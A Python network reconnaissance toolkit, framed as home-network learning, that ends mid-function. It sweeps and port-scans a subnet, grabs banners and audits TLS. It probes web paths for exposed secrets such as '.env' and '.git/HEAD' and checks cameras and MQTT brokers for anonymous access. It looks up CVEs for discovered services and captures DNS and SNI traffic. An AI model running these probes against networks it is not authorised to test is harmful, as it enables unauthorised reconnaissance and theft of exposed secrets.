#!/usr/bin/env python3
"""
lan-toolkit.py  -  Home network tinkering toolkit (cross-platform)
------------------------------------------------------------------
Legitimate network admin / security learning for devices and networks
YOU OWN. Do not use against networks or devices that are not yours.

Standard library only - no pip installs needed.
Works on Windows, macOS and Linux.

Run:   python lan-toolkit.py
Some steps work best in an admin/root shell (packet capture, OS scan).
"""

import concurrent.futures as cf
import contextlib
import json
import os
import platform
import re
import shutil
import socket
import subprocess
import sys
import threading
import time

# scapy is needed ONLY for the ARP intercept lab (menu option 5). It is
# imported lazily inside that function, so the rest of this stdlib-only
# toolkit works without it.  Install with:  pip install scapy

IS_WIN = platform.system() == "Windows"
IS_MAC = platform.system() == "Darwin"
HOME = os.path.expanduser("~")


# ----------------------------------------------------------------------
# Network auto-detection
# ----------------------------------------------------------------------
def local_ip():
    """Find this machine's LAN IP by opening a throwaway UDP socket."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))   # no packets actually sent for UDP
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


def default_gateway(prefix):
    """Best-effort gateway detection; falls back to <prefix>1."""
    try:
        if IS_WIN:
            out = subprocess.run(["ipconfig"], capture_output=True, text=True).stdout
            m = re.search(r"Default Gateway[ .]*: ?([\d.]+)", out)
            if m:
                return m.group(1)
        elif IS_MAC:
            # macOS has no `ip`; use the route table
            out = subprocess.run(["route", "-n", "get", "default"],
                                 capture_output=True, text=True).stdout
            m = re.search(r"gateway:\s*([\d.]+)", out)
            if m:
                return m.group(1)
        else:
            out = subprocess.run(["ip", "route"], capture_output=True, text=True).stdout
            m = re.search(r"default via ([\d.]+)", out)
            if m:
                return m.group(1)
    except Exception:
        pass
    return prefix + "1"


def get_net():
    ip = local_ip()
    prefix = ip.rsplit(".", 1)[0] + "."
    return {"ip": ip, "prefix": prefix, "gateway": default_gateway(prefix)}


def find_tool(name, extra_paths):
    p = shutil.which(name)
    if p:
        return p
    for cand in extra_paths:
        if os.path.exists(cand):
            return cand
    return None


def find_nmap():
    return find_tool("nmap", [
        r"C:\Program Files (x86)\Nmap\nmap.exe",
        r"C:\Program Files\Nmap\nmap.exe",
        "/opt/homebrew/bin/nmap",   # macOS Apple Silicon (Homebrew)
        "/usr/local/bin/nmap",      # macOS Intel (Homebrew)
        "/usr/bin/nmap",            # Linux
    ])


def find_tshark():
    return find_tool("tshark", [
        r"C:\Program Files\Wireshark\tshark.exe",
        r"/Applications/Wireshark.app/Contents/MacOS/tshark",
    ])


def wifi_interface(tshark):
    """Return the tshark interface number whose name looks like Wi-Fi."""
    out = subprocess.run([tshark, "-D"], capture_output=True, text=True).stdout
    for line in out.splitlines():
        if re.search(r"wi-?fi|wlan|wlp|wlx|wl\d|wireless|airport|en0", line, re.I):
            m = re.match(r"\s*(\d+)\.", line)
            if m:
                return m.group(1)
    return None


# ----------------------------------------------------------------------
# STEP 1 - Discover devices
# ----------------------------------------------------------------------
def ping(host):
    if IS_WIN:
        cmd = ["ping", "-n", "1", "-w", "300", host]          # -w = ms
    elif IS_MAC:
        cmd = ["ping", "-c", "1", "-t", "1", host]            # macOS: -t = seconds
    else:
        cmd = ["ping", "-c", "1", "-W", "1", host]            # Linux: -W = seconds
    return subprocess.run(cmd, capture_output=True).returncode == 0


def ping_sweep(prefix):
    hosts = [f"{prefix}{i}" for i in range(1, 255)]
    alive = []
    with cf.ThreadPoolExecutor(max_workers=64) as ex:
        for host, ok in zip(hosts, ex.map(ping, hosts)):
            if ok:
                alive.append(host)
    return alive


def arp_table(prefix):
    """Return {ip: mac} from the OS ARP cache. Falls back to `ip neigh` on
    Linux systems where net-tools `arp` is not installed."""
    try:
        out = subprocess.run(["arp", "-a"], capture_output=True, text=True).stdout
    except FileNotFoundError:
        out = ""
    if not out.strip() and not IS_WIN:
        try:
            out = subprocess.run(["ip", "neigh"], capture_output=True, text=True).stdout
        except Exception:
            out = ""
    table = {}
    for line in out.splitlines():
        if prefix not in line:
            continue
        ipm = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", line)
        macm = re.search(r"([0-9a-fA-F]{2}([:-])[0-9a-fA-F]{2}(?:\2[0-9a-fA-F]{2}){4})", line)
        if ipm and macm:
            ip = ipm.group(1)
            mac = macm.group(1).lower().replace("-", ":")
            # skip broadcast / multicast entries
            if ip.endswith(".255") or mac == "ff:ff:ff:ff:ff:ff":
                continue
            octet = int(ip.split(".")[0])
            if 224 <= octet <= 239:   # multicast range
                continue
            table[ip] = mac
    return table


def hostname_for(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror, OSError):
        return "-"


def is_private_mac(mac):
    """Randomized / locally-administered MAC: 2nd hex digit in {2,6,a,e}."""
    try:
        return mac[1].lower() in "26ae"
    except IndexError:
        return False


# A few common OUIs for offline answers; anything else falls back to the
# free macvendors.com API (we send only the 3-byte prefix, not the full MAC).
_OUI_COMMON = {
    "f4:27:56": "Technicolor (router)", "fc:ec:da": "Ubiquiti",
    "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
    "00:15:5d": "Microsoft (Hyper-V/WSL)", "48:46:c1": "Nokia/Sagemcom",
}
_oui_cache = {}


def mac_vendor(mac):
    """Best-effort manufacturer for a MAC. Randomized MACs have no vendor."""
    if is_private_mac(mac):
        return "(randomized)"
    prefix = mac[:8].lower()
    if prefix in _oui_cache:
        return _oui_cache[prefix]
    v = _OUI_COMMON.get(prefix, "")
    if not v:
        try:
            import urllib.request
            req = urllib.request.Request("https://api.macvendors.com/" + prefix,
                                         headers={"User-Agent": "lan-toolkit"})
            v = urllib.request.urlopen(req, timeout=4).read().decode().strip()
        except Exception:
            v = ""
    _oui_cache[prefix] = v
    return v or "?"


def device_type(vendor, ports):
    """Guess what a device is from its vendor and open ports."""
    v = (vendor or "").lower()
    ps = set(ports or [])
    if 32400 in ps:                       return "Plex media server"
    if 9100 in ps:                        return "Printer"
    if 554 in ps:                         return "IP camera"
    if 8009 in ps:                        return "Chromecast / cast device"
    if "raspberry" in v:                  return "Raspberry Pi"
    if "router" in v or 53 in ps:         return "Router / gateway"
    if {445, 139} & ps:                   return "Windows PC / NAS"
    if "apple" in v:                      return "Apple device"
    if "samsung" in v:                    return "Samsung device"
    if "xiaomi" in v:                     return "Xiaomi device"
    if not ps:                            return "client (phone/tablet?)"
    return "?"


def grab_banner(ip, port, timeout=2.0):
    """Read the greeting a TCP service sends (SSH/FTP/SMTP banners, HTTP Server
    header). Returns a short string or ''."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            if s.connect_ex((ip, port)) != 0:
                return ""
            if port in (80, 8080, 8000):      # HTTP: ask so it replies
                s.sendall(b"HEAD / HTTP/1.0\r\nHost: %b\r\n\r\n" % ip.encode())
            data = s.recv(256)
            for line in data.split(b"\r\n"):
                if port in (80, 8080, 8000) and line.lower().startswith(b"server:"):
                    return line.decode("utf-8", "replace").strip()
            first = data.split(b"\r\n")[0].decode("utf-8", "replace").strip()
            return first[:80]
    except Exception:
        return ""


def discover_devices(net):
    """Ping-sweep + ARP + name resolution. Returns rows, no printing."""
    ping_sweep(net["prefix"])
    table = arp_table(net["prefix"])
    table.setdefault(net["ip"], "(this pc)")   # ensure we list ourselves
    rows = []
    for ip in sorted(table, key=lambda x: int(x.split(".")[-1])):
        mac = table[ip]
        note = "ROUTER" if ip == net["gateway"] else ("THIS PC" if ip == net["ip"] else "")
        priv = "yes" if is_private_mac(mac) else "no"
        rows.append((ip, mac, hostname_for(ip), priv, note))
    return rows


def print_devices(rows, indent="", vendors=True):
    print(f"{indent}{'IP':<16}{'MAC':<20}{'NAME':<20}{'VENDOR':<22}NOTE")
    print(f"{indent}{'-' * 80}")
    for ip, mac, name, priv, note in rows:
        v = mac_vendor(mac) if (vendors and mac not in ("(this pc)",)) else ""
        print(f"{indent}{ip:<16}{mac:<20}{name[:19]:<20}{v[:21]:<22}{note}")


def step_discover(net):
    print(f"\n[Step 1] Discovering devices on {net['prefix']}0/24 ...")
    print("Pinging 254 addresses...\n")
    rows = discover_devices(net)
    print_devices(rows)
    return rows


# ----------------------------------------------------------------------
# STEP 2 - Port scan
# ----------------------------------------------------------------------
# Single source of truth: ports we scan for, with friendly labels.
# Any port NOT here still gets a name via the OS services file (port_name).
PORTS = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http",
    110: "pop3", 139: "file-share", 143: "imap", 443: "https", 445: "smb",
    554: "rtsp/cam", 1883: "mqtt", 3389: "rdp", 5000: "upnp", 5900: "vnc",
    8000: "dev-server", 8080: "http-alt", 8009: "chromecast", 8443: "https-alt",
    9100: "printer", 32400: "plex",
}


def port_name(port):
    """Friendly label for a port: curated map first, then the OS services file."""
    if port in PORTS:
        return PORTS[port]
    try:
        return socket.getservbyport(port)      # from /etc/services or Windows equivalent
    except OSError:
        return "?"


def scan_port(ip, port, timeout=0.6):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        return port if s.connect_ex((ip, port)) == 0 else None


def scan_common(ip):
    """Return a sorted list of open common ports on ip."""
    open_ports = []
    with cf.ThreadPoolExecutor(max_workers=50) as ex:
        futs = {ex.submit(scan_port, ip, p): p for p in PORTS}
        for fut in cf.as_completed(futs):
            r = fut.result()
            if r:
                open_ports.append(r)
    return sorted(open_ports)


def builtin_scan(ip):
    print(f"\n[Step 2] Built-in scan of {ip} ({len(PORTS)} common ports)...")
    open_ports = scan_common(ip)
    if not open_ports:
        print("  All scanned ports closed (typical for a phone/client device).")
    for p in open_ports:
        print(f"  {p:<6} open   {port_name(p)}")


# ---- assessment helpers used by the host profile (items 5, 6, 11, 2) ----

def tls_audit(ip, port=443):
    """[5] TLS protocol support + certificate summary. Returns list of strings."""
    import ssl, warnings
    warnings.filterwarnings("ignore")      # quiet the TLSv1/1.1 deprecation notices
    out = []
    supported = []
    for name, ver in [("TLSv1.0", getattr(ssl.TLSVersion, "TLSv1", None)),
                      ("TLSv1.1", getattr(ssl.TLSVersion, "TLSv1_1", None)),
                      ("TLSv1.2", ssl.TLSVersion.TLSv1_2),
                      ("TLSv1.3", ssl.TLSVersion.TLSv1_3)]:
        if ver is None:
            continue
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.minimum_version = ctx.maximum_version = ver
        except ValueError:
            continue
        try:
            with socket.create_connection((ip, port), timeout=4) as s:
                with ctx.wrap_socket(s, server_hostname=ip):
                    supported.append(name)
        except Exception:
            pass
    if not supported:
        return ["no TLS handshake (maybe not TLS on this port)"]
    weak = [v for v in supported if v in ("TLSv1.0", "TLSv1.1")]
    out.append("TLS: " + ", ".join(supported) + (f"   [WEAK: {', '.join(weak)}]" if weak else ""))
    try:
        import ssl as _ssl, datetime
        from cryptography import x509
        pem = _ssl.get_server_certificate((ip, port), timeout=5)
        c = x509.load_pem_x509_certificate(pem.encode())
        subj, iss = c.subject.rfc4514_string(), c.issuer.rfc4514_string()
        exp = c.not_valid_after_utc
        days = (exp - datetime.datetime.now(datetime.timezone.utc)).days
        out.append(f"cert: {subj[:48]}")
        out.append(f"  issuer {iss[:40]}" + ("  [SELF-SIGNED]" if subj == iss else ""))
        out.append(f"  expires {exp.date()} ({days}d)" + ("  [EXPIRED]" if days < 0 else ""))
    except Exception as e:
        out.append(f"cert parse failed: {e}")
    return out


WEB_PATHS = ["admin", "login", "robots.txt", ".git/HEAD", ".env", "api", "config",
             "backup", "phpmyadmin", "server-status", "wp-login.php", "dashboard"]


def web_discover(ip, port, scheme="http"):
    """[6] Probe common web paths. Detects catch-all/SPA servers (which return
    200 for everything) to avoid false positives."""
    import urllib.request, urllib.error, ssl, random
    ctx = None
    if scheme == "https":
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

    def code_for(path):
        try:
            req = urllib.request.Request(f"{scheme}://{ip}:{port}/{path}",
                                         headers={"User-Agent": "lan-toolkit"})
            r = urllib.request.urlopen(req, timeout=4, context=ctx)
            return r.status
        except urllib.error.HTTPError as e:
            return e.code
        except Exception:
            return None

    if code_for("nope-%d-zzz" % random.randint(1000, 9999)) == 200:
        return ["  (server answers 200 for ALL paths - SPA/catch-all; discovery unreliable)"]
    found = [f"  {c}  /{p}" for p in WEB_PATHS
             for c in [code_for(p)] if c in (200, 301, 302, 401, 403)]
    return found or ["  (no common paths found)"]


def iot_probe(ip, open_ports):
    """[11] Interact with IoT/service protocols on known ports. Returns list."""
    out = []
    if 554 in open_ports:
        try:
            with socket.create_connection((ip, 554), timeout=4) as s:
                s.sendall(f"OPTIONS rtsp://{ip}:554 RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
                resp = s.recv(512).decode("utf-8", "replace")
            if "RTSP" in resp:
                out.append(f"  RTSP camera: rtsp://{ip}:554/  (open in VLC: Media > Open Network Stream)")
        except Exception:
            pass
    if 1883 in open_ports:
        try:
            pkt = bytes([0x10, 0x0c, 0x00, 0x04]) + b"MQTT" + bytes([0x04, 0x02, 0x00, 0x3c, 0x00, 0x00])
            with socket.create_connection((ip, 1883), timeout=4) as s:
                s.sendall(pkt); r = s.recv(4)
            if r and r[0] == 0x20:
                out.append(f"  MQTT broker open: {ip}:1883 (accepts anonymous connect)")
        except Exception:
            pass
    if 80 in open_ports or 8080 in open_ports:
        hp = 80 if 80 in open_ports else 8080
        out.append(f"  HTTP UI: http://{ip}:{hp}/  (cameras often stream MJPEG here - opens in a browser)")
    if 9100 in open_ports:
        out.append(f"  Raw print (JetDirect): {ip}:9100")
    if 631 in open_ports:
        out.append(f"  IPP printer: http://{ip}:631/")
    return out


def _nvd_request(url):
    """Build an NVD API request with our UA and the optional NVD_API_KEY header."""
    import urllib.request
    req = urllib.request.Request(url, headers={"User-Agent": "lan-toolkit"})
    key = os.environ.get("NVD_API_KEY")
    if key:
        req.add_header("apiKey", key)
    return req


def _nvd_severity(cve):
    """Pull a severity/score string out of an NVD CVE's metrics (v3.1/3.0/2)."""
    for k in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
        m = cve.get("metrics", {}).get(k)
        if m:
            d = m[0].get("cvssData", {})
            return d.get("baseSeverity") or str(d.get("baseScore", "?"))
    return "?"


def _shodan_cvedb(param, value, max_results):
    """Query Shodan CVEDB (free, no key) by product= or cpe23=. Returns a list of
    formatted CVE lines, or [] on miss/error."""
    import urllib.request, urllib.parse, json
    try:
        u = "https://cvedb.shodan.io/cves?%s=%s&limit=%d" % (
            param, urllib.parse.quote(value), max_results)
        d = json.load(urllib.request.urlopen(
            urllib.request.Request(u, headers={"User-Agent": "lan-toolkit"}), timeout=15))
        cves = d.get("cves", [])[:max_results]
        tag = f"  (product={value})" if param == "product" else ""
        return [f"  {c.get('cve_id', '?')}  cvss={c.get('cvss', '?')}{tag}" for c in cves]
    except Exception:
        return []


def vuln_lookup(query, max_results=3):
    """[2] Look up CVEs for a service banner. Order of preference:
       1. searchsploit (offline, version-aware) if installed
       2. Shodan CVEDB  (free, no key, product-level) - the reliable default
       3. NVD keyword   (free but 503-flaky without a key; set NVD_API_KEY to fix)
    Returns list of strings."""
    import re as _re, urllib.request, urllib.parse, json
    q = (query or "").strip()
    if not q:
        return []

    # 1. searchsploit (best when available)
    ss = shutil.which("searchsploit")
    if ss:
        try:
            out = subprocess.run([ss, q], capture_output=True, text=True, timeout=15).stdout
            hits = [ln.strip() for ln in out.splitlines() if "|" in ln and "----" not in ln][:max_results]
            if hits:
                return ["  " + h for h in hits]
        except Exception:
            pass

    # product keyword from the banner, e.g. "Apache/2.4.49" -> "apache"
    m = _re.search(r"[A-Za-z][A-Za-z+_.-]{2,}", q)
    product = (m.group(0) if m else q.split()[0]).lower().strip("._-")

    # 2. Shodan CVEDB (no key, reliable)
    hits = _shodan_cvedb("product", product, max_results)
    if hits:
        return hits

    # 3. NVD keyword fallback (flaky without a key)
    url = ("https://services.nvd.nist.gov/rest/json/cves/2.0?resultsPerPage=%d&keywordSearch=%s"
           % (max_results, urllib.parse.quote(q)))
    try:
        data = json.load(urllib.request.urlopen(_nvd_request(url), timeout=12))
    except Exception as e:
        return [f"  (CVE lookup unavailable: {e}; product={product})"]
    res = []
    for item in data.get("vulnerabilities", [])[:max_results]:
        cve = item.get("cve", {})
        res.append(f"  {cve.get('id', '?')}  severity={_nvd_severity(cve)}")
    return res or ["  (no CVEs matched this banner)"]


def nvd_cpe_search(keyword, limit=10):
    """Find official CPE names for a product in NVD's CPE dictionary.
    Returns (list_of_cpe_names, error_or_None)."""
    import urllib.request, urllib.parse, json
    u = ("https://services.nvd.nist.gov/rest/json/cpes/2.0?resultsPerPage=%d&keywordSearch=%s"
         % (limit, urllib.parse.quote(keyword)))
    req = _nvd_request(u)
    last = None
    for attempt in range(3):          # NVD is 503-flaky without a key
        try:
            d = json.load(urllib.request.urlopen(req, timeout=15))
            return [p["cpe"]["cpeName"] for p in d.get("products", [])], None
        except Exception as e:
            last = e
            if attempt < 2:
                time.sleep(6)
    return [], f"{last} (NVD flaky without a key — set NVD_API_KEY)"


def vuln_lookup_cpe(cpe, max_results=8):
    """Version-exact CVE lookup by CPE 2.3 string. Shodan CVEDB (no key) first,
    then NVD cpeName. Returns list of strings."""
    import urllib.request, urllib.parse, json
    hits = _shodan_cvedb("cpe23", cpe, max_results)
    if hits:
        return hits
    u = ("https://services.nvd.nist.gov/rest/json/cves/2.0?resultsPerPage=%d&cpeName=%s"
         % (max_results, urllib.parse.quote(cpe)))
    try:
        d = json.load(urllib.request.urlopen(_nvd_request(u), timeout=15))
    except Exception as e:
        return [f"  (CVE-by-CPE lookup failed: {e})"]
    res = []
    for item in d.get("vulnerabilities", [])[:max_results]:
        cve = item.get("cve", {})
        res.append(f"  {cve.get('id', '?')}  severity={_nvd_severity(cve)}")
    return res or ["  (no CVEs for that CPE)"]


def step_portscan(net):
    choice = input(f"Target IP, 'all' for whole subnet, or blank to pick from a list: ").strip()
    if choice.lower() == "all":
        target = f"{net['prefix']}0/24"
    elif choice:
        target = choice
    else:
        target = _pick_device(net, ipv6=False)
        if not target:
            return

    nmap = find_nmap()
    # Whole-subnet: just the service scan (per-host profiling would be slow).
    if target.endswith("/24"):
        if nmap:
            print(f"\n[Step 2] nmap service scan of {target} (top 100 ports)...")
            subprocess.run([nmap, "-sV", "-T4", "--top-ports", "100", target])
        else:
            print("nmap not found - scan one host at a time with the built-in scanner.")
        return

    # Single host: profile it (vendor -> type -> ports -> banners -> OS)
    print(f"\n[Step 2] Profiling {target} ...")
    mac = arp_table(net["prefix"]).get(target, "")
    vendor = mac_vendor(mac) if mac else "?"
    ports = scan_common(target)
    print(f"  MAC/vendor : {mac or '?'}  {vendor}")
    print(f"  Likely type: {device_type(vendor, ports)}")
    banners = {}
    if ports:
        print("  Open ports :")
        for p in ports:
            banner = grab_banner(target, p)                 # [8] banner grab
            banners[p] = banner
            print(f"    {p:<6} {port_name(p):<12}{banner}")
    else:
        print("  Open ports : none (typical phone/tablet client)")

    # [5] TLS audit on HTTPS ports
    for tp in (443, 8443):
        if tp in ports:
            print(f"\n  [TLS audit :{tp}]")
            for ln in tls_audit(target, tp):
                print(f"    {ln}")

    # [11] IoT / service-protocol interaction
    iot = iot_probe(target, ports)
    if iot:
        print("\n  [Services / IoT]")
        for ln in iot:
            print(ln)

    # [2] CVE lookup for the most interesting banner (NVD free API / searchsploit)
    cand = next((banners[p] for p in (80, 443, 22, 8080, 21) if banners.get(p)), "")
    if cand:
        print(f"\n  [CVE lookup] for: {cand[:50]}")
        for ln in vuln_lookup(cand):
            print(ln)

    # [6] web content discovery (opt-in: noisier)
    web_ports = [p for p in (80, 8080, 443, 8443) if p in ports]
    if web_ports and input("\nProbe common web paths? [y/N]: ").strip().lower() == "y":
        for wp in web_ports:
            scheme = "https" if wp in (443, 8443) else "http"
            print(f"\n  [web paths {scheme}:{wp}]")
            for ln in web_discover(target, wp, scheme):
                print(ln)

    # [7] OS fingerprint via nmap (needs admin/root for the raw probes)
    if nmap and input("\nRun OS fingerprint? (needs admin) [y/N]: ").strip().lower() == "y":
        print(f"\nnmap -O {target} ...")
        subprocess.run([nmap, "-O", "-sV", "--top-ports", "100", target])


# ----------------------------------------------------------------------
# STEP 3 - Read traffic
# ----------------------------------------------------------------------
def _dns_capture(tshark, iface, duration):
    """Capture outbound DNS queries for `duration`s and return a deduped list of
    (source_ip, domain), with .local names tagged (mDNS). Shared by the traffic
    step and the auto report."""
    cap = subprocess.run(
        [tshark, "-i", iface, "-a", f"duration:{duration}", "-n",
         "-Y", "dns.flags.response==0", "-T", "fields",
         "-e", "ip.src", "-e", "dns.qry.name"],
        capture_output=True, text=True).stdout
    seen = []
    for line in cap.splitlines():
        parts = line.split("\t")
        if len(parts) != 2 or not parts[0] or not parts[1]:
            continue
        src = parts[0]
        dom = parts[1].split(",")[0]          # first name if several
        if dom.endswith(".local"):
            dom += "  (mDNS)"                  # local service discovery
        if (src, dom) not in seen:
            seen.append((src, dom))
    return seen


def step_traffic(net):
    print("\n[Step 3] Reading traffic")
    print("""You see THIS machine's unicast traffic, PLUS everyone's multicast/
broadcast (e.g. mDNS '.local' names other devices announce). HTTPS
payloads are encrypted - you see WHICH hosts, not the contents.
""")
    print("  a) 15s DNS capture       (domains being looked up)")
    print("  b) 15s connections       (which servers this PC connects to - TLS SNI)")
    print("  c) 15s top talkers       (bandwidth: which servers use the most data)")
    print("  d) save 20s to a .pcap   (open later in Wireshark)")
    sub = input("Choose a/b/c/d [a]: ").strip().lower() or "a"

    tshark = find_tshark()
    if not tshark:
        print("tshark not found (comes with Wireshark). Install Wireshark first.")
        return
    iface = wifi_interface(tshark)
    if not iface:
        subprocess.run([tshark, "-D"])
        iface = input("Enter the Wi-Fi interface number from the list above: ").strip()

    # [14] pcap export
    if sub == "d":
        path = os.path.join(HOME, "Downloads", "lan-capture.pcap")
        print(f"\nCapturing 20s to {path} (browse to generate traffic)...")
        try:
            subprocess.run([tshark, "-i", iface, "-a", "duration:20", "-w", path])
            print(f"Saved. Open it in Wireshark:  wireshark \"{path}\"")
        except Exception as e:
            print(f"Capture failed ({e}). Npcap may need an admin shell.")
        return

    # [13] top talkers / per-host bandwidth
    if sub == "c":
        print(f"\nMeasuring bandwidth for 15s on interface {iface} ...")
        print("(only THIS PC's traffic is visible unless you're intercepting)\n")
        try:
            cap = subprocess.run([tshark, "-i", iface, "-a", "duration:15", "-n",
                                  "-T", "fields", "-e", "ip.src", "-e", "ip.dst",
                                  "-e", "frame.len"], capture_output=True, text=True).stdout
        except Exception as e:
            print(f"Capture failed ({e})."); return
        me = net["ip"]
        bytes_by_peer = {}
        for line in cap.splitlines():
            p = line.split("\t")
            if len(p) != 3 or not p[2].isdigit():
                continue
            peer = p[1] if p[0] == me else p[0]      # the non-local side
            if peer and peer != me and not peer.startswith("224.") and peer != "255.255.255.255":
                bytes_by_peer[peer] = bytes_by_peer.get(peer, 0) + int(p[2])
        top = sorted(bytes_by_peer.items(), key=lambda kv: -kv[1])[:10]
        if not top:
            print("  (no traffic seen - try while something is downloading/streaming)")
        print(f"  {'KB':>8}  SERVER")
        print("  " + "-" * 50)
        for peer, b in top:
            rdns, org = _ip_lookup(peer)
            label = rdns or org or peer
            print(f"  {b/1024:8.1f}  {peer:<16}{label}")
        return

    # [11] connections / SNI (live stream; TLS ClientHello carries SNI in clear)
    if sub == "b":
        print(f"\nCapturing HTTPS connections for 15s on interface {iface} ...")
        print("(browse something on this PC to see more)\n")
        print(f"{'DEST IP':<17}{'PORT':<6}SERVER")
        print("-" * 55)
        fields = ["-e", "ip.dst", "-e", "tcp.dstport",
                  "-e", "tls.handshake.extensions_server_name"]
        try:
            subprocess.run([tshark, "-i", iface, "-a", "duration:15", "-n",
                            "-Y", "tls.handshake.type==1", "-T", "fields"] + fields)
        except Exception as e:
            print(f"Capture failed ({e}). Npcap may need an admin shell.")
        return

    # [10] DNS capture (deduped summary - same engine as --auto's report)
    print(f"\nCapturing DNS queries for 15s on interface {iface} ...")
    print("(browse something on this PC to see more)\n")
    print(f"{'SOURCE':<16}DOMAIN")
    print("-" * 50)
    try:
        seen = _dns_capture(tshark, iface, 15)
    except Exception as e:
        print(f"Capture failed ({e}). Npcap may need an admin shell."); return
    if seen:
        for src, dom in seen:
            print(f"  {src:<16}{dom}")
    else:
        print("  (no DNS lookups in this 15s window - try while browsing)")


# ----------------------------------------------------------------------
# STEP 4 - Remote access helpers
# ----------------------------------------------------------------------
def _listening_ports():
    """Return ['139 file-share', '445 smb', ...] for curated ports this PC
    listens on. Uses netstat, falling back to `ss` where netstat is absent
    (modern Linux drops net-tools)."""
    out = ""
    for cmd in (["netstat", "-an"], ["ss", "-ltn"]):
        try:
            out = subprocess.run(cmd, capture_output=True, text=True).stdout
            if out.strip():
                break
        except FileNotFoundError:
            continue
    seen = set()
    for line in out.splitlines():
        if "LISTEN" not in line.upper():
            continue
        # peer columns on a LISTEN line are :0 or :* (never a curated port),
        # so scanning the whole line and filtering by PORTS is safe for both
        # netstat and ss output formats.
        for m in re.findall(r"[:.](\d+)\b", line):
            if int(m) in PORTS:
                seen.add(int(m))
    return [f"{p} {port_name(p)}" for p in sorted(seen)]


def _upnp_mappings():
    """Ask the router's UPnP IGD for its port-forward table. Returns a list of
    mapping strings, [] if none, or None if no IGD responded. Pure stdlib."""
    import urllib.request
    from urllib.parse import urljoin
    msg = ("M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\n"
           'MAN:"ssdp:discover"\r\nMX:2\r\n'
           "ST:urn:schemas-upnp-org:service:WANIPConnection:1\r\n\r\n")
    location = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(3)
        s.sendto(msg.encode(), ("239.255.255.250", 1900))
        data, _ = s.recvfrom(65535)
        s.close()
        for line in data.decode("utf-8", "replace").split("\r\n"):
            if line.lower().startswith("location:"):
                location = line.split(":", 1)[1].strip()
    except Exception:
        return None
    if not location:
        return None
    try:
        xml = urllib.request.urlopen(location, timeout=4).read().decode("utf-8", "replace")
    except Exception:
        return None
    ctrl = stype = None
    for m in re.finditer(r"<service>(.*?)</service>", xml, re.S):
        blk = m.group(1)
        if "WANIPConnection" in blk or "WANPPPConnection" in blk:
            cm = re.search(r"<controlURL>(.*?)</controlURL>", blk)
            tm = re.search(r"<serviceType>(.*?)</serviceType>", blk)
            if cm and tm:
                ctrl, stype = urljoin(location, cm.group(1).strip()), tm.group(1).strip()
                break
    if not ctrl:
        return None
    results = []
    for i in range(50):
        body = ('<?xml version="1.0"?><s:Envelope '
                'xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
                's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
                f'<u:GetGenericPortMappingEntry xmlns:u="{stype}">'
                f'<NewPortMappingIndex>{i}</NewPortMappingIndex>'
                '</u:GetGenericPortMappingEntry></s:Body></s:Envelope>')
        req = urllib.request.Request(ctrl, data=body.encode(),
              headers={"Content-Type": 'text/xml; charset="utf-8"',
                       "SOAPAction": f'"{stype}#GetGenericPortMappingEntry"'})
        try:
            resp = urllib.request.urlopen(req, timeout=4).read().decode("utf-8", "replace")
        except Exception:
            break   # index past the end -> SOAP fault -> we're done
        g = lambda t: (re.search(f"<{t}>(.*?)</{t}>", resp) or [None, ""])[1] \
            if re.search(f"<{t}>(.*?)</{t}>", resp) else ""
        if not g("NewExternalPort"):
            break
        results.append(f"{g('NewProtocol'):<4} ext:{g('NewExternalPort')} -> "
                       f"{g('NewInternalClient')}:{g('NewInternalPort')}  "
                       f"({g('NewPortMappingDescription')})")
    return results


def _remote_host_snapshot():
    """This PC's remote-access posture: (ssh_present, rdp_enabled). rdp_enabled is
    None on non-Windows or if the registry read fails. Shared by the remote-access
    step and the auto report."""
    ssh = shutil.which("ssh") is not None
    rdp = None
    if IS_WIN:
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               r"System\CurrentControlSet\Control\Terminal Server")
            rdp = winreg.QueryValueEx(k, "fDenyTSConnections")[0] == 0
        except OSError:
            rdp = None
    return ssh, rdp


def step_remote(net):
    print("\n[Step 4] Remote access to your own devices")
    print(f"""  SSH out:        ssh user@<ip>
  Remote Desktop: mstsc /v:<ip>   (target must be Windows Pro+ with RDP on)
  Router admin:   http://{net['gateway']}
""")

    ssh, rdp = _remote_host_snapshot()
    print("This machine's remote-access tools:")
    print(f"  SSH client: {'yes' if ssh else 'no'}")
    if rdp is not None:
        print(f"  RDP host (incoming): {'enabled' if rdp else 'disabled'}"
              "  (note: Windows Home cannot host RDP)")

    print("\nThis machine's listening services:")
    listening = _listening_ports()
    if listening:
        for item in listening:
            print(f"  port {item}")
    else:
        print("  (no common server ports listening - this PC is a pure client)")

    # [9] what the router has forwarded/opened to the internet (UPnP)
    print("\nRouter port-forwards (UPnP IGD):")
    maps = _upnp_mappings()
    if maps is None:
        print("  (no UPnP IGD responded - UPnP off or unsupported on this router)")
    elif not maps:
        print("  none - nothing forwarded to the internet (good)")
    else:
        for m in maps:
            print("  " + m)

    # [21] launch an actual remote session to a chosen device
    if input("\nConnect to a device now? [y/N]: ").strip().lower() == "y":
        ip = _pick_device(net, ipv6=False)
        if ip:
            proto = (input(f"{ip}: (s)sh / (r)dp / (v)nc [s]: ").strip().lower() or "s")
            if proto == "s":
                user = input("SSH username: ").strip() or "root"
                subprocess.run(["ssh", f"{user}@{ip}"])
            elif proto == "r":
